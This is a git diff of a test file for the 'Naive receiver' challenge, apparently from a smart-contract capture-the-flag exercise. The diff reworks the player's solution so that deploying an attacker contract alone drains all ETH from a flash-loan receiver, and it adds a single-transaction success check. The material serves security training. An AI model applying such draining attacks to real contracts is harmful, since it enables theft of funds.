@@ -38,16 +38,16 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const attacker = await (await ethers.getContractFactory('NaiveReceiverAttacker', player)).deploy(
+        await (await ethers.getContractFactory('NaiveReceiverAttacker', player)).deploy(
             pool.address,
             receiver.address
         );
-        
-        await attacker.connect(user).attack();
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        // Player executed a single transaction
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
 
         // All ETH has been drained from the receiver
         expect(
